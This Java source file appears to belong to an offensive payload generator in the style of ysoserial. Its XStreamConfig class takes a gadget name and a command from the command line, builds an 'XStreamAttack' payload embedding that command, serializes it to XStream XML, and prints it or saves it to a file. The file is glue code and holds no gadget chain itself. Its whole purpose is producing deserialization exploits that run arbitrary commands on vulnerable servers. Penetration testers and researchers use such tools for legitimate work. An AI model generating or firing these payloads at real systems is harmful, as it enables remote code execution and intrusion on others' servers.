package cn.butler.xstream.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.config.Config;
import cn.butler.utils.FileUtils;
import cn.butler.xstream.Serializer;
import org.apache.commons.cli.CommandLine;

public class XStreamConfig extends Config {

    public void parse(CommandLine cmdLine){

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("XStreamAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            if(cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile");
                String serialize = Serializer.serialize(object);
                FileUtils.savePayloadToFile(serialize,fileName);
                System.exit(0);
            }
            //原版的输出
            String serialize = Serializer.serialize(object);
            System.out.println(serialize);
            System.exit(0);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }
}
